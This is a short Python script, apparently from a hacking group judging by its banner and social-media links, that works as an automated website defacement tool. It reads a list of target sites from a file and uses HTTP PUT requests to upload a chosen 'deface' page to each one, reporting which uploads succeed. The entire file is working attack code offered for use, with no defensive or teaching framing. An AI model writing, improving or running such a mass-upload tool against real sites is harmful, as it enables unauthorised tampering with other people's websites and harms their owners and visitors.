# -*- coding: utf-8 -*-

try:
    import requests
    import os.path
    import sys
except ImportError:
    exit("install requests and try again ...")

print("""\033[1;31m

            ___  __             
   /\  |  |  |  /  \            
  /~~\ \__/  |  \__/            
                              
   __   ___  ___       __   ___ 
  |  \ |__  |__   /\  /  ` |__  
  |__/ |___ |    /~~\ \__, |___                        

""")

print("\033[1;32m	|~| Mr. R013X 404 |~|")

banner = """\033[1;35m
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  
[~] Facebook : https://www.facebook.com/Mr.R013X.404
[~] Telegram : https://t.me/MR_R013X_404
[~] Page     : https://www.facebook.com/Bads.community.bd
[~] Group    : https://www.facebook.com/groups/team.bads

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"""


b = '\033[31m'
h = '\033[32m'
m = '\033[00m'


def x(tetew):
    ipt = ''
    if sys.version_info.major > 2:
        ipt = input(tetew)
    else:
        ipt = raw_input(tetew)

    return str(ipt)


def aox(script, target_file="target.txt"):
    op = open(script, "r").read()
    with open(target_file, "r") as target:
        target = target.readlines()
        s = requests.Session()
        print("uploading file to %d website" % (len(target)))
        for web in target:
            try:
                site = web.strip()
                if site.startswith("http://") is False:
                    site = "http://" + site
                req = s.put(site + "/" + script, data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print(m + "[" + b + " FAILED!" + m + " ] %s/%s" % (site, script))
                else:
                    print(m + "[" + h + " SUCCESS" + m + " ] %s/%s" % (site, script))

            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print;
                exit()


def main(__bn__):
    print (__bn__)
    while True:
        try:
            a = x("\033[1;36m Enter your script deface name: ")
            if not os.path.isfile(a):
                print("file '%s' not found" % (a))
                continue
            else:
                break
        except KeyboardInterrupt:
            print;
            exit()

    aox(a)


if __name__ == "__main__":
    main(banner)
